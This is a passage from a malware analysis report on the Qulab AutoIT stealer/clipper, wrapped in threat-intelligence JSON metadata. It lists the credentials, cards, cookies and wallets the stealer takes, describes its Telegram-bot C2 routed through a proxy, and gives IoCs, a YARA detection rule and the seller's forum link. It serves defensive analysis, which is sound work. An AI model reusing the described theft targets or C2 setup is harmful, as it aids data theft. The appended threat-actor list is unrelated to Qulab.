Method\n\n\n-----\n\nssw Compress files open for writing\n\nIn the end, this is an example of a final archive file.\n\nBut there is a possibility to have all these files & folders:\n```\n\\1\\Passwords.txt\n\\1\\Information.txt\n\\1\\Screen.jpg\n\\1\\AutoFills.txt\n\\1\\CreditCards.txt\n\\1\\Cookies\n\\1\\Desktop TXT Files\n\\1\\Discord\n\\1\\Telegram\n\\1\\Steam\n\\1\\Exodus\n\\1\\Wallets\n\\1\\FileZilla\n\\1\\SDA\n\n## Cleaning process\n\n```\nSimple and effective:\n\nKilling the process\nDeleting the script directory\n\n\n-----\n\nIt s easily catchable on the monitoring logs.\n\n## Telegram Bot as C2?\n\nThis malware is using a Telegram bot for communicating & alerting when data have been\nstolen. As usual, it‚Äôs using some UDF functions, so there is nothing really new. It‚Äôs not really\ncomplicated to understand how it‚Äôs working.\n\nWhen a bot is created, there is a unique authentication token that could be used after for\nmaking requests to it.\n\napi.telegram.org/bot/\n\nAlso, it‚Äôs using a private proxy when it‚Äôs sending the request to the bot :\n\nThese values are used to configure the proxy setting during the HTTP request :\n\n## How it looks like on the other side?\n\nThis malware is developed by Qulab, and it took seconds to find the official sale post his\nstealer/clipper. As usual, every marketing that you want to know about it is detailed.\n\nThis stealer/clipper is sold 2000 rubles (~30$)\n\n\n-----\n\nSupport is possible\n\n## Let‚Äôs do some funny stuff\n\nI made some really funny unexpected content by modifying some instructions to make\nsomething that is totally unrelated at all. Somewhat, patching malware could be really\nentertaining and interesting!\n\nNote: If you haven‚Äôt seen the anime ‚ÄúKonosuba‚Äù, you will not understand at all, what‚Äôs going\non :p\n\nWatch Video At:\n\nhttps://youtu.be/gRgJ1XlQGYQ\n\n\n-----\n\n## Additional Data\n\n IoC\n\nHashes\n\na915fc346ed7e984e794aa9e0d497137\n887fac71dc7e038bc73dc9362585bf70\na915fc346ed7e984e794aa9e0d497137\n\nIP\n\n185.142.97.228\n\nProxy Port\n\n65233\n\nSchedule Task\n\n%PAYLOAD_NAME%\nRandom Description\n\nFolders & Files\n\n%APPDATA%/%RANDOM_FOLDER%/\n%APPDATA%/%RANDOM_FOLDER%/1/\n%PAYLOAD_NAME%.module.exe (7zip)\n%PAYLOAD_NAME%.sqlite.module.exe (sqlite3.dll)\n\nThreat Actor\n\n[Qulab](https://darkwebs.ws/members/141222/)\n\n## MITRE ATT&CK\n\n Software & Language used\n\nAutoIT\nAut2Exe (Decompiler)\nmyAut2Exe (Decompiler)\nCFF Explorer\nx32dbg\nPython\n\n\n-----\n\n## Yara\n```\nrule Qulab_Stealer : Qulab \n{\n meta:\n  description = \"Yara rule for detecting Qulab (In memory only)\"\n  author = \"Fumik0_\"\n strings:\n  $s1 = \"QULAB CLIPPER + STEALER\" wide ascii\n  $s2 = \"SDA\" wide ascii\n  $s3 = \"SELECT * FROM Win32_VideoController\" wide ascii\n  $s4 = \"maFile\" wide ascii\n  $s5 = \"Exodus\" wide ascii\n condition:\n  all of ($s*)\n}\n\n Conclusion\n\n```\nWell, it‚Äôs cool sometimes to dig into some stuff that is not really common for the language\nchoice (on my point of view for this malware). It‚Äôs entertaining and always worth to learn new\ncontent, find new tools, find a new perspective to put your head into some totally unknown\nfields.\n\nQulab stealer is interesting just in fact that is using AutoIT and abusing a telegram bot for\nsharing some data but stealing & clipper features remain the same as all the other stealers.\nThe other thing that, it‚Äôs confirming also that more and more people are using User Defined\nFunctions/Libraries free to use to do good or bad things, this trends will be more and more\ncommon in those days, developers or simple users with lack of skills is now just doing some\ngoogle research and will be able to make a software or a malware, without knowing anything\nin depth about what the code is doing, when the task is done, nothing else matters at the\nend.\n\nBut I admit, I really take pleasure to patch it for stupid & totally useless stuff üôÇ\n\nNow it‚Äôs time for a break.\n\n\n-----\n\n#HappyHunting\n\nSpecial thanks: @siri_urz, @hh86_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-25 - Let‚Äôs play with Qulab, an exotic malware developed in AutoIT.pdf"
    ],
    "report_names": [
        "2019-03-25 - Let‚Äôs play with Qulab, an exotic malware developed in AutoIT.pdf"
    ],
    "threat_actors": [
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "23dfc9f5-1862-4510-a6ae-53d8e51f17b1",
            "created_at": "2024-05-01T02:03:08.146025Z",
            "updated_at": "2025-03-27T02:05:17.420497Z",
            "deleted_at": null,
            "main_name": "PLATINUM TERMINAL",
            "aliases": [
                "Longhorn ",
                "The Lamberts ",
                "Vault7 ",
                "APT-C-39 "
            ],
            "source_name": "Secureworks:PLATINUM TERMINAL",
            "tools": [
                " Assassin",
                " Marble Framework",
                "AfterMidnight"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e993faab-f941-4561-bd87-7c33d609a4fc",
            "created_at": "2022-10-25T16:07:23.460301Z",
            "updated_at": "2025-03-27T02:02:09.814816Z",
            "deleted_at": null,
            "main_name": "Longhorn",
            "aliases": [
                "APT-C-39",
                "Platinum Terminal",
                "The Lamberts"
            ],
            "source_name": "ETDA:Longhorn",
            "tools": [
                "Black Lambert",
                "Blue Lambert",
                "Corentry",
                "Cyan Lambert",
                "Fluxwire",
                "Gray Lambert",
                "Green Lambert",
                "Magenta Lambert",
                "Pink Lambert",
                "Plexor",
                "Purple Lambert",
                "Silver Lambert",
                "Violet Lambert",
                "White Lambert"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "70db80bd-31b7-4581-accb-914cd8252913",
            "created_at": "2023-01-06T13:46:38.57727Z",
            "updated_at": "2025-03-27T02:00:02.865012Z",
            "deleted_at": null,
            "main_name": "Longhorn",
            "aliases": [
                "the Lamberts",
                "APT-C-39",
                "PLATINUM TERMINAL"
            ],
            "source_name": "MISPGALAXY:Longhorn",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535983,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653700881,
    "ts_modification_date": 1653700881,
    "files": {
        "pdf": "https://archive.orkl.eu/b7b42ab80142732b80c8f8fc2ab9881ec1fb437e.pdf",
        "text": "https://archive.orkl.eu/b7b42ab80142732b80c8f8fc2ab9881ec1fb437e.txt",
        "img": "https://archive.orkl.eu/b7b42ab80142732b80c8f8fc2ab9881ec1fb437e.jpg"
    }
}